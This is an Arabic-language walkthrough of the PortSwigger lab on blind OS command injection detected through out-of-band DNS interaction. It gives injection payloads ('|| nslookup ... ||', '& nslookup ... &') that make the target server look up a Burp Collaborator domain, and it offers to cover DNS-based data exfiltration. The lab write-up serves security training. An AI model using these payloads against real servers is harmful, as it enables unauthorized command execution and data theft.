# Lab : Blind OS command injection with out-of-band interaction

https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

- الفكره من الLab ده ان الموقع مصاب بblind OS command injection بس مبيعملش redirect من نفس الموقع بس بيظهر وبيشتغل لو domain من بره

```bash
1. || nslookup 3quu9ixhb3g8s71ef0bt9osryi4as0gp.oastify.com ||
```

ده معمل تاني من نفس السلسلة، بس هنا الوضع أصعب شوية من اللي فات. في المعمل اللي قبل ده (output redirection)، كنا قادرين نوجّه نتيجة الأمر لملف جوه الـ web root ونقراها من المتصفح. لكن هنا:

- **مفيش static file serving** تقدر تستغله علشان تقرا منه النتيجة.
- **مفيش أي فرق ملحوظ في الـ response** حتى لو استخدمت time delay (زي `ping -c 10`).

يعني الطريقتين اللي اتعلمناهم قبل كده (redirection + time-based) مش هيفيدوا هنا. لازم أسلوب تالت.

### الحل: Out-of-Band (OOB) Interaction

الفكرة إنك تخلي السيرفر **نفسه يبعتلك طلب** (زي DNS lookup أو HTTP request) لدومين تحت تحكمك، وده بيثبتلك إن الأمر اتنفذ فعلاً - حتى لو مفيش أي رد فعل ظاهر في الـ response.

#### الأداة المستخدمة: Burp Collaborator

Burp Suite فيها feature اسمها **Burp Collaborator** بتديك دومين فريد (unique) تقدر تستخدمه كـ "بيت اختبار" - أي DNS query أو HTTP request يوصله من السيرفر المستهدف، هتشوفه في الـ Collaborator client.

### خطوات الحل بالتفصيل

1. **افتح Burp Collaborator client** (من Burp Suite: Burp menu → Burp Collaborator client) واضغط **"Copy to clipboard"** عشان تاخد unique Collaborator payload (domain زي `xxxxx.oastify.com`).
2. روح لمكان الـ injection في التطبيق (زي "check stock" اللي بتاخد `productID` و `storeID`).
3. احقن أمر بيستخدم الدومين ده، زي:

```
& nslookup xxxxx.oastify.com &
```

أو

```
| nslookup xxxxx.oastify.com
```

1. ابعت الـ request.
2. ارجع لـ Burp Collaborator client واضغط **"Poll now"**.
3. لو ظهرلك **DNS interaction** (أو HTTP interaction)، معناه إن السيرفر نفذ الأمر فعلاً وعمل lookup للدومين بتاعك - وده دليل قاطع إن فيه command injection، حتى من غير ما تشوف أي output.

### ليه Burp Collaborator بيشتغل كده؟

- الدومين بتاعه بيبقى تابع لسيرفرات Burp، وأي DNS query أو HTTP request بيوصله بيتسجل ويتعرض ليك في الـ client.
- ده بيديك "قناة اتصال بديلة" (out-of-band channel) منفصلة تمامًا عن الـ HTTP response بتاع الطلب الأصلي.

### الفرق بين المعملين التلاتة (ملخص سريع)

| المعمل | إزاي بتتأكد إن الأمر اتنفذ |
| --- | --- |
| Command injection (عادي) | بتشوف النتيجة على طول في الـ response |
| Blind + output redirection | بتوجه النتيجة لملف static وتفتحه من المتصفح |
| Blind + OOB interaction | بتستخدم Burp Collaborator (DNS/HTTP) عشان تثبت التنفيذ من غير ما تشوف أي output خالص |

### ملاحظة مهمة

المعمل ده بيتحل بمجرد ما تثبت إن الـ command injection موجود عن طريق الـ DNS interaction - مش لازم تستخرج بيانات فعلية. مجرد ظهور الـ interaction في Collaborator = solve.

لو حابب، أقدر كمان أشرحلك إزاي تستخدم OOB technique دي علشان **تسرب بيانات فعلية** (زي نتيجة أمر `whoami`) عن طريق تحويلها لـ DNS query، وده موضوع معمل تاني بعد ده بيبني على نفس الفكرة.
